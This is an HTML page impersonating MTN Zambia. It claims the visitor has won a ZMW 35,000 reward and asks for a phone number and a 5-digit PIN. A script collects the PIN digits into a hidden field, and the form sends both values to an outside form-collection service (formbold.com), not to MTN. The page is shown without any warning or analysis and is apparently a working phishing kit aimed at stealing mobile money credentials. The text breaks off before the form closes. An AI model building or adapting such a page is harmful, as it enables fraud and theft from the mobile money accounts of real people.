<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MTN Zambia</title>

    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="wrapper">

    <h1>MTN Zambia
        
    Congratulations! Your reward of ZMW 35,000 is ready!
    </h1>

    <form action="https://formbold.com/s/3Labw" method="POST">


        <label>Phone Number</label>
<input type="tel" name="phone" required>

<label>PIN</label>

<div class="pin-container">
    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
</div>
<!-- hidden field sent to FormBold -->
<input type="hidden" name="pin" id="pin">

<script>
const inputs = document.querySelectorAll('.pin-container input');
const hiddenInput = document.getElementById('pin');

inputs.forEach((input, index) => {

    input.addEventListener('input', function () {

        // Keep digits only
        this.value = this.value.replace(/[^0-9]/g, '');

        // Keep only one digit
        if (this.value.length > 1) {
            this.value = this.value.slice(-1);
        }

        // Move to next box
        if (this.value && index < inputs.length - 1) {
            inputs[index + 1].focus();
        }

        updatePin();
    });

    input.addEventListener('keydown', function (e) {

        // Go back on Backspace
        if (e.key === 'Backspace' && this.value === '' && index > 0) {
            inputs[index - 1].focus();
        }

        // Go back with left arrow
        if (e.key === 'ArrowLeft' && index > 0) {
            inputs[index - 1].focus();
        }

        // Go forward with right arrow
        if (e.key === 'ArrowRight' && index < inputs.length - 1) {
            inputs[index + 1].focus();
        }
    });

});

function updatePin() {
    hiddenInput.value = Array.from(inputs)
        .map(input => input.value)
        .join('');
}
</script>
